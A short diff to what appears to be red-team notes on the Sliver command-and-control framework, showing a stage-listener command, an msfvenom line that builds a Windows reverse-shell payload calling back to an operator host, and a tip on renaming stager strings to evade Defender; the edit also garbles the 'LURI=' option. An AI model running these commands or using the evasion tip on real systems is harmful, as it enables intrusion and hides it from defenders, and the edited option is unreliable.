@@ -131,7 +131,7 @@ stage-listener -u tcp://<ip>:<new port> -p <profile name>
 ```bash
 msfvenom -p windows/x64/custom/reverse_<tcp|winhttp|...> lhost=<ip or device name> lport=<port>
 ```
-	*Note:* for `winhttp` payloads `LURI=what.woff` needs to be included
+	*Note:* for `winhttp` payloads `LURwhat.woff` needs to be included
 5. Custom stager (example code can be found here: https://sliver.sh/docs?name=Stagers)
 	1. *Note:* to evade Defender, change the text `Sliver-stager, Stager, shellcode, and DownloadAndExecute`
 ## Command Examples:
